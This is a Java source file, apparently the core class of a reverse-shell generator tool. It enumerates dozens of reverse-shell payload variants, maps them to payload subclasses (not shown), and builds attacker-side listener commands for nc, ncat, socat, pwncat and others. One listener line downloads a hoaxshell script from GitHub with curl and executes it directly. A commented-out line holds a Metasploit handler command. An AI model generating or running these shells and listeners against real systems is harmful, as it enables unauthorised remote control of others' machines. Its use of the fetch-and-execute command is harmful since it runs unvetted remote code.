/**
 * ReverseShell
 */
package com.iteso.ReverseShellGenerator;

import java.util.regex.Matcher;
import java.util.regex.Pattern;

import com.iteso.ReverseShellGenerator.Interfaces.ReverseGetShellCode;
import com.iteso.ReverseShellGenerator.Reverse.Shells.*;

public class ReverseShell implements ReverseGetShellCode{

    // Attributes
    protected String localIP = "10.10.10.10";
    protected int localPort = 9000;
    protected boolean requireRootPermissions = false;
    protected LISTENER listener = null;
    protected SHELLS shellType = null;
    protected String shell = "";

    // Statics Variables
    private final static int PRIVILEGED_PORTS = 1024;
    private final static int MIN_PORT = 0;
    private final static int MAX_PORT = 65536;
    private final static String IP_REGEXP = "^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$";

    // Listeners
    public enum LISTENER{
        NC, NC_FREEBSD, BUSYBOX_NC, NCAT, NCAT_EXE, NCAT_TLS,
        RLWRAP_NC, RUST_CAT, RUSTCAT_COMMAND_HISTORY, PWNCAT,
        WINDOWS_CONPTY, SOCAT, SOCAT_TTY, POWERCAT, MSFCONSOLE, HOAXSHELL
    }

    // Reverse Shells
    public enum REVERSE_TYPE{
        BASH_i, BASH_196, BASH_READ_LINE, BASH_5, BASH_UDP, NC_MKFIFO, NC_e, NC_exe_e, BUSYBOX_NC_e,
        NC_c, NCAT_e, NCAT_EXE_e, NCAT_UDP, RUSTCAT, C, C_WINDOWS, C_SHARP_TCP_CLIENT, C_SHARP_BASH_i,
        HASHKELL_1, PERL, PERL_NO_SH, PERL_PENTESTMONKEY, PHP_PENTESTMONKEY, PHP_IVAN_SINCEK, PHP_CMD,
        PHP_CMD_2, PHP_CMD_SMALL, PHP_EXEC, PHP_SHELL_EXEC, PHP_SYSTEM, PHP_PASSTHRU, PHP, PHP_POPEN,
        PHP_PROC_OPEN, WINDOWS_CONPTY, POWERSHELL_1, POWERSHELL_2, POWERSHELL_3, POWERSHELL_4_TLS,
        PYTHON_1, PYTHON_2, PYTHON3_1, PYTHON3_2, PYTHON3_WINDOWS, PYTHON3_SHORTEST,
        RUBY_1, RUBY_NO_SH, SOCAT_1, SOCAT_2_TTY, SQLITE3_NC_MKFIFO, NODE_JS, NODE_JS_2, JAVA_1, JAVA_2,
        JAVA_3, JAVA_WEB, JAVA_TWO_WAY, JAVASCRIPT, GROOVY, TELNET, ZSH, LUA_1, LUA_2, GOLANG, VLANG,
        AWK, DART, CRYSTAL_SYSTEM, CRYSTAL_CODE
    }

    // Shells
    public enum SHELLS{
        SH("sh"), BIN_SH("/bin/sh"), BASH("bash"), BIN_BASH("/bin/bash"), CMD("cmd"),
        POWERSHELL("powershell"), PWSH("pwsh"), ASH("ash"), BSH("bsh"), CSH("csh"),
        KSH("ksh"), ZSH("zsh"), PDKSH("pdksh"), TCSH("tcsh"), MKSH("mksh"), DASH("dash");

        protected String shell = "";
        SHELLS(String shell){
            setShell(shell);
        }

        public void setShell(String shell) {
            this.shell = shell;
        }

        public String getShell() {
            return shell;
        }
    }

    protected ReverseShell(String localIP, int localPort, LISTENER listener, SHELLS shellType){
        setLocalIP(localIP);
        setLocalPort(localPort);
        setPortRequireRootPermissions();
        setListener(listener);
        setShellType(shellType);
    }

    public static ReverseShell getShellInstance(String localIP, int localPort, LISTENER listener, REVERSE_TYPE revType, SHELLS shellType){
        switch(revType){
            case BASH_i:
                return new Bash_i(localIP, localPort, listener, shellType);
            case BASH_196:
                return new Bash_196(localIP, localPort, listener, shellType);
            case BASH_5:
                return new Bash_5(localIP, localPort, listener, shellType);
            case BASH_READ_LINE:
                return new Bash_readline(localIP, localPort, listener, shellType);
            case BASH_UDP:
                return new Bash_udp(localIP, localPort, listener, shellType);
            case NC_MKFIFO:
                return new Nc_mkfifo(localIP, localPort, listener, shellType);
            case NC_e:
                return new Nc_e(localIP, localPort, listener, shellType);
            case AWK:
                return new Awk(localIP, localPort, listener, shellType);
            case BUSYBOX_NC_e:
                return new Busybox_nce(localIP, localPort, listener, shellType);
            case C:
                return new C(localIP, localPort, listener, shellType);
            case CRYSTAL_CODE:
                return new Crystal_code(localIP, localPort, listener, shellType);
            case CRYSTAL_SYSTEM:
                return new Crystal_system(localIP, localPort, listener, shellType);
            case C_SHARP_BASH_i:
                return new C_Bashi(localIP, localPort, listener, shellType);
            case C_SHARP_TCP_CLIENT:
                return new CTCP_Client(localIP, localPort, listener, shellType);
            case C_WINDOWS:
                return new C_Windows(localIP, localPort, listener, shellType);
            case DART:
                return new Dart(localIP, localPort, listener, shellType);
            case GOLANG:
                return new Golang(localIP, localPort, listener, shellType);
            case GROOVY:
                return new Groovy(localIP, localPort, listener, shellType);
            case HASHKELL_1:
                return new Haskell1(localIP, localPort, listener, shellType);
            case JAVASCRIPT:
                return new Javascript(localIP, localPort, listener, shellType);
            case JAVA_1:
                return new Java_1(localIP, localPort, listener, shellType);
            case JAVA_2:
                return new Java_2(localIP, localPort, listener, shellType);
            case JAVA_3:
                return new Java_3(localIP, localPort, listener, shellType);
            case JAVA_TWO_WAY:
                return new Java_two_way(localIP, localPort, listener, shellType);
            case JAVA_WEB: 
                return new Java_web(localIP, localPort, listener, shellType);
            case LUA_1:
                return new Lua_1(localIP, localPort, listener, shellType);
            case LUA_2:
                return new Lua_2(localIP, localPort, listener, shellType);
            case NCAT_EXE_e:
                return new NCAT_EXE(localIP, localPort, listener, shellType);
            case NCAT_UDP:
                return new Ncat_udp(localIP, localPort, listener, shellType);
            case NCAT_e:
                return new Ncat_e(localIP, localPort, listener, shellType);
            case NC_c:
                return new Nc_c(localIP, localPort, listener, shellType);
            case NC_exe_e:
                return new Nc_exe_e(localIP, localPort, listener, shellType);
            case NODE_JS:
                return new Node_js(localIP, localPort, listener, shellType);
            case NODE_JS_2: 
                return new Node_js2(localIP, localPort, listener, shellType);
            case PERL:
                return new Perl(localIP, localPort, listener, shellType);
            case PERL_NO_SH:
                return new Perlnosh(localIP, localPort, listener, shellType);
            case PERL_PENTESTMONKEY:
                return new PerlPentestMonkey(localIP, localPort, listener, shellType);
            case PHP:
                return new Php__(localIP, localPort, listener, shellType);
            case PHP_CMD:
                return new Php_cmd(localIP, localPort, listener, shellType);
            case PHP_CMD_2:
                return new Php_cmd2(localIP, localPort, listener, shellType);
            case PHP_CMD_SMALL:
                return new Php_cmd_small(localIP, localPort, listener, shellType);
            case PHP_EXEC:
                return new Php_exec(localIP, localPort, listener, shellType);
            case PHP_IVAN_SINCEK:
                return new Php_Sincek(localIP, localPort, listener, shellType);
            case PHP_PASSTHRU:
                return new Php_passthru(localIP, localPort, listener, shellType);
            case PHP_PENTESTMONKEY:
                return new PhpPentestMonkey(localIP, localPort, listener, shellType);
            case PHP_POPEN:
                return new Php_popen(localIP, localPort, listener, shellType);
            case PHP_PROC_OPEN:
                return new Php_procopen(localIP, localPort, listener, shellType);
            case PHP_SHELL_EXEC:
                return new Php_shell_Exec(localIP, localPort, listener, shellType);
            case PHP_SYSTEM:
                return new Php_System(localIP, localPort, listener, shellType);
            case POWERSHELL_1:
                return new Powershell_1(localIP, localPort, listener, shellType);
            case POWERSHELL_2:
                return new Powershell_2(localIP, localPort, listener, shellType);
            case POWERSHELL_3:
                return new Powershell_3(localIP, localPort, listener, shellType);
            case POWERSHELL_4_TLS: 
                return new Powershell_4(localIP, localPort, listener, shellType);
            case PYTHON3_1:
                return new Python3_1(localIP, localPort, listener, shellType);
            case PYTHON3_2:
                return new Python3_2(localIP, localPort, listener, shellType);
            case PYTHON3_SHORTEST:
                return new Python3_shortest(localIP, localPort, listener, shellType);
            case PYTHON3_WINDOWS:
                return new Python3_Windows(localIP, localPort, listener, shellType);
            case PYTHON_1:
                return new Python_1(localIP, localPort, listener, shellType);
            case PYTHON_2:
                return new Python_2(localIP, localPort, listener, shellType);
            case RUBY_1:
                return new Ruby_1(localIP, localPort, listener, shellType);
            case RUBY_NO_SH:
                return new Ruby_no_sh(localIP, localPort, listener, shellType);
            case RUSTCAT:
                return new Rustcat(localIP, localPort, listener, shellType);
            case SOCAT_1:
                return new Socat_1(localIP, localPort, listener, shellType);
            case SOCAT_2_TTY:
                return new Socat_2_tty(localIP, localPort, listener, shellType);
            case SQLITE3_NC_MKFIFO:
                return new Sqlite3_nc_mkfifo(localIP, localPort, listener, shellType);
            case TELNET:
                return new Telnet(localIP, localPort, listener, shellType);
            case VLANG:
                return new Vlang(localIP, localPort, listener, shellType);
            case WINDOWS_CONPTY:
                return new Windows_conpty(localIP, localPort, listener, shellType);
            case ZSH:
                return new Zsh(localIP, localPort, listener, shellType);
            default:
                break;
        }

        return null;
    }

    public void setLocalIP(String localIP){
        if(isIPValid())
            this.localIP = localIP;
    }

    public void setLocalPort(int localPort){
        if(localPort >= MIN_PORT && localPort <=  MAX_PORT)
            this.localPort = localPort;
    }

    public void setListener(LISTENER listener) {
        this.listener = listener;
    }

    public void setShellType(SHELLS shellType) {
        this.shellType = shellType;
        this.shell = this.shellType.getShell();
    }

    private boolean isPortPrivileged(){
        return this.localPort < PRIVILEGED_PORTS ? true : false;
    }

    private void setPortRequireRootPermissions(){
        this.requireRootPermissions = isPortPrivileged();
    }

    public String getLocalIP(){
        return this.localIP;
    }

    public int getLocalPort(){
        return this.localPort;
    }

    public SHELLS getShellType() {
        return shellType;
    }

    public String getShell() {
        return shell;
    }

    protected Boolean getRequireRootPermissions(){
        return this.requireRootPermissions;
    }

    public boolean isIPValid(){
        Pattern pattern = Pattern.compile(IP_REGEXP, Pattern.CASE_INSENSITIVE);
        Matcher matcher = pattern.matcher(this.getLocalIP());
        return matcher.find();
    }

    public String toString(){
        return "{" +
                    "\"localIP\": " + "\"" + getLocalIP() + "\"," +
                    "\"localPort\": " + getLocalPort() + "," +
                    "\"requireRootPermission\": " + getRequireRootPermissions() +
                "}";
    }
/* 
    public String getShellCode(){
        if(this instanceof Bash_i)
            return ((Bash_i)this).getShell();

        return null;
    }*/

    public String getListenerCode(){
        String sudoStr = isPortPrivileged() ? "sudo " : "";

        switch(this.listener){
            case NC:
                return String.format("%snc -lvnp %s", sudoStr, getLocalPort());
            case BUSYBOX_NC:
                return String.format("%sbusybox nc -lp %s", sudoStr, getLocalPort());
            case HOAXSHELL:
                return String.format("%spython3 -c \"$(curl -s https://raw.githubusercontent.com/t3l3machus/hoaxshell/main/revshells/hoaxshell-listener.py)\" -t {type} -p %s", sudoStr, getLocalPort());
            case MSFCONSOLE:
                return "NOT SUPPORTED";
            //    return String.format("%smsfconsole -q -x \"use multi/handler; set payload {payload}; set lhost %s; set lport %s; exploit\"", sudoStr, getLocalIP(), getLocalPort());
            case NCAT_EXE:
                return String.format("%sncat.exe -lvnp %s", sudoStr, getLocalPort());
            case NCAT:
                return String.format("%sncat -lvnp %s", sudoStr, getLocalPort());
            case NCAT_TLS:
                return String.format("%sncat --ssl -lvnp %s", sudoStr, getLocalPort());
            case NC_FREEBSD:
                return String.format("%snc -lvn %s", sudoStr, getLocalPort());
            case POWERCAT:
                return String.format("%spowercat -l -p %s", sudoStr, getLocalPort());
            case PWNCAT:
                return String.format("%spython3 -m pwncat -lp %s", sudoStr, getLocalPort());
            case RLWRAP_NC:
                return String.format("%srlwrap -cAr nc -lvnp %s", sudoStr, getLocalPort());
            case RUSTCAT_COMMAND_HISTORY:
                return String.format("%srcat -lHp %s", sudoStr, getLocalPort());
            case RUST_CAT:
                return String.format("%srcat -lp %s", sudoStr, getLocalPort());
            case SOCAT:
                return String.format("%ssocat -d -d TCP-LISTEN:%s STDOUT", sudoStr, getLocalPort());
            case SOCAT_TTY:
                return String.format("%ssocat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:%s", sudoStr, getLocalPort());
            case WINDOWS_CONPTY:
                return String.format("%sstty raw -echo; (stty size; cat) | nc -lvnp %s", sudoStr, getLocalPort());
            default:
                break;
        }

        return null;
    }

    @Override
    public String getShellCode() {
        // TODO Auto-generated method stub
        throw new UnsupportedOperationException("Unimplemented method 'getShell'");
    }

}